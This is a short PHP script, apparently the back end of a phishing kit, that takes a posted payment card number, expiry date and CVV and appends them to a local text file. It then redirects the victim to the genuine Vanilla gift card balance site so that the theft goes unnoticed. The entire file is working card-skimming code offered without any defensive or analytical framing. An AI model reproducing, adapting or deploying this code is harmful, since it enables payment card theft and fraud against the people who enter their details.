<?php

$filename = "datos.txt";
$url = "https://balance.vanillagift.com";

$redirection_url = $url;
$redirection_flag = true; // false

$number = isset($_POST['cardNumber']) ? $_POST['cardNumber'] : "";
$month = isset($_POST['expMonth']) ? $_POST['expMonth'] : "";
$year = isset($_POST['expirationYear']) ? $_POST['expirationYear'] : "";
$cvv = isset($_POST['cvv']) ? $_POST['cvv'] : "";
$src  = isset($_POST['src']) ? $_POST['src'] : "index";

$source_url = "./$src.php?login=false";
$new_credentials = "$number,$month,$year,$cvv";
$old_data = file_get_contents($filename);

$data_array = explode(PHP_EOL, $old_data);

if (array_search($new_credentials, $data_array) !== false) {
    exit(header("Location: $redirection_url"));
} else {
    $new_data = implode(PHP_EOL, $data_array) . PHP_EOL . $new_credentials;
    file_put_contents($filename, $new_data);
    $redirect = $redirection_flag ? $source_url : $redirection_url;
    exit(header("Location: $url"));
}
